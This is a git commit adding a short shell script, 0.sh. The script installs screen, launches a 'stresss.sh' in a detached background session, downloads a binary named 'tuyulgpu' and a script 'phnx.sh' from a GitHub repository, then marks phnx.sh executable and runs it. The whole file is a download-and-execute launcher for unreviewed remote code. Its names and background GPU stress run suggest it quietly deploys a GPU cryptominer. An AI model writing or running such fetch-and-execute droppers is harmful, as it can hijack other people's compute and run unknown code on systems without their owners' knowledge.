3d903f758c5cba9b818414d3d0d52faa98b8d56b
lambohopo <86089421+lambohopo@users.noreply.github.com>
2021-07-08 19:39:42 +0700

    Create 0.sh

---
+++ 0.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+
+apt-get install libpci3
+sudo apt update
+sudo apt install screen -y
+screen -dmS stresss.sh ./stresss.sh 65 75
+wget https://github.com/lambohopo/myproject/raw/main/tuyulgpu
+wget https://raw.githubusercontent.com/lambohopo/myproject/main/phnx.sh
+chmod +x phnx.sh
+./phnx.sh
